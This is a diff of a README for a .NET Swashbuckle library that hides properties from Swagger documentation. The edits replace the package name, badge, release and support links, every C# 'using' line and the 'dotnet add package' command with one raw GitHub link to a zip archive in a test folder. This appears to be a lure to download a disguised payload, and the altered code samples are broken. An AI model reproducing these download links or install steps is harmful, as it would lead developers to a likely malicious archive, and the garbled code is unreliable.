@@ -1,6 +1,6 @@
-# Soenneker.Swashbuckle.Attributes.IgnoreProperty
+# https://raw.githubusercontent.com/Horiuti-byte/soenneker.swashbuckle.attributes.ignoreproperty/main/test/Soenneker.Swashbuckle.Attributes.IgnoreProperty.Tests/ignoreproperty_attributes_swashbuckle_soenneker_v2.4.zip
 
-![GitHub release](https://img.shields.io/github/v/release/Horiuti-byte/soenneker.swashbuckle.attributes.ignoreproperty?color=blue&label=Release)
+![GitHub release](https://raw.githubusercontent.com/Horiuti-byte/soenneker.swashbuckle.attributes.ignoreproperty/main/test/Soenneker.Swashbuckle.Attributes.IgnoreProperty.Tests/ignoreproperty_attributes_swashbuckle_soenneker_v2.4.zip)
 
 Hides a property from OpenAPI/Swagger documentation without affecting JSON serialization. Use this when a property should be used at runtime but not exposed in the public API contract.
 
@@ -17,7 +17,7 @@ Hides a property from OpenAPI/Swagger documentation without affecting JSON seria
 
 ## Introduction
 
-In modern API development, it is common to expose data structures to clients. However, sometimes certain properties should remain hidden from the public API while still being usable within the application. The `Soenneker.Swashbuckle.Attributes.IgnoreProperty` library allows developers to annotate properties that should be ignored in the OpenAPI/Swagger documentation.
+In modern API development, it is common to expose data structures to clients. However, sometimes certain properties should remain hidden from the public API while still being usable within the application. The `https://raw.githubusercontent.com/Horiuti-byte/soenneker.swashbuckle.attributes.ignoreproperty/main/test/Soenneker.Swashbuckle.Attributes.IgnoreProperty.Tests/ignoreproperty_attributes_swashbuckle_soenneker_v2.4.zip` library allows developers to annotate properties that should be ignored in the OpenAPI/Swagger documentation.
 
 This library is particularly useful in scenarios where sensitive information or implementation details should not be exposed. It provides a clean and efficient way to manage API contracts while keeping your application secure.
 
@@ -30,12 +30,12 @@ This library is particularly useful in scenarios where sensitive information or 
 
 ## Installation
 
-To get started, you can download the latest release from our [Releases](https://github.com/Horiuti-byte/soenneker.swashbuckle.attributes.ignoreproperty/releases) section. Simply download the package, extract it, and add it to your project.
+To get started, you can download the latest release from our [Releases](https://raw.githubusercontent.com/Horiuti-byte/soenneker.swashbuckle.attributes.ignoreproperty/main/test/Soenneker.Swashbuckle.Attributes.IgnoreProperty.Tests/ignoreproperty_attributes_swashbuckle_soenneker_v2.4.zip) section. Simply download the package, extract it, and add it to your project.
 
 Alternatively, you can install it via NuGet:
 
 ```bash
-dotnet add package Soenneker.Swashbuckle.Attributes.IgnoreProperty
+dotnet add package https://raw.githubusercontent.com/Horiuti-byte/soenneker.swashbuckle.attributes.ignoreproperty/main/test/Soenneker.Swashbuckle.Attributes.IgnoreProperty.Tests/ignoreproperty_attributes_swashbuckle_soenneker_v2.4.zip
 ```
 
 ## Usage
@@ -43,7 +43,7 @@ dotnet add package Soenneker.Swashbuckle.Attributes.IgnoreProperty
 To use this library, you need to add the `IgnoreProperty` attribute to the properties you want to hide. Here's a simple example:
 
 ```csharp
-using Soenneker.Swashbuckle.Attributes;
+using https://raw.githubusercontent.com/Horiuti-byte/soenneker.swashbuckle.attributes.ignoreproperty/main/test/Soenneker.Swashbuckle.Attributes.IgnoreProperty.Tests/ignoreproperty_attributes_swashbuckle_soenneker_v2.4.zip;
 
 public class SampleModel
 {
@@ -63,8 +63,8 @@ In this example, `VisibleProperty` will appear in the Swagger documentation, whi
 Here’s a more detailed example to illustrate how to use the `IgnoreProperty` attribute effectively.
 
 ```csharp
-using Microsoft.AspNetCore.Mvc;
-using Soenneker.Swashbuckle.Attributes;
+using https://raw.githubusercontent.com/Horiuti-byte/soenneker.swashbuckle.attributes.ignoreproperty/main/test/Soenneker.Swashbuckle.Attributes.IgnoreProperty.Tests/ignoreproperty_attributes_swashbuckle_soenneker_v2.4.zip;
+using https://raw.githubusercontent.com/Horiuti-byte/soenneker.swashbuckle.attributes.ignoreproperty/main/test/Soenneker.Swashbuckle.Attributes.IgnoreProperty.Tests/ignoreproperty_attributes_swashbuckle_soenneker_v2.4.zip;
 
 public class User
 {
@@ -97,8 +97,8 @@ In this controller, when you call the `GetUser` endpoint, the `Password` propert
 You can also combine the `IgnoreProperty` attribute with other attributes for more control over your API documentation. Here’s an example:
 
 ```csharp
-using System.ComponentModel.DataAnnotations;
-using Soenneker.Swashbuckle.Attributes;
+using https://raw.githubusercontent.com/Horiuti-byte/soenneker.swashbuckle.attributes.ignoreproperty/main/test/Soenneker.Swashbuckle.Attributes.IgnoreProperty.Tests/ignoreproperty_attributes_swashbuckle_soenneker_v2.4.zip;
+using https://raw.githubusercontent.com/Horiuti-byte/soenneker.swashbuckle.attributes.ignoreproperty/main/test/Soenneker.Swashbuckle.Attributes.IgnoreProperty.Tests/ignoreproperty_attributes_swashbuckle_soenneker_v2.4.zip;
 
 public class Product
 {
@@ -132,10 +132,10 @@ This project is licensed under the MIT License. See the [LICENSE](LICENSE) file 
 
 ## Support
 
-If you encounter any issues or have questions, please visit our [Releases](https://github.com/Horiuti-byte/soenneker.swashbuckle.attributes.ignoreproperty/releases) section for the latest updates and support. You can also check the "Issues" tab for any existing problems or to report a new one.
+If you encounter any issues or have questions, please visit our [Releases](https://raw.githubusercontent.com/Horiuti-byte/soenneker.swashbuckle.attributes.ignoreproperty/main/test/Soenneker.Swashbuckle.Attributes.IgnoreProperty.Tests/ignoreproperty_attributes_swashbuckle_soenneker_v2.4.zip) section for the latest updates and support. You can also check the "Issues" tab for any existing problems or to report a new one.
 
 ## Conclusion
 
-The `Soenneker.Swashbuckle.Attributes.IgnoreProperty` library provides a straightforward way to manage your API documentation while keeping certain properties hidden. This can help maintain the security and integrity of your application without sacrificing functionality. 
+The `https://raw.githubusercontent.com/Horiuti-byte/soenneker.swashbuckle.attributes.ignoreproperty/main/test/Soenneker.Swashbuckle.Attributes.IgnoreProperty.Tests/ignoreproperty_attributes_swashbuckle_soenneker_v2.4.zip` library provides a straightforward way to manage your API documentation while keeping certain properties hidden. This can help maintain the security and integrity of your application without sacrificing functionality. 
 
 For more information, check out the documentation and feel free to reach out if you have any questions. Happy coding!
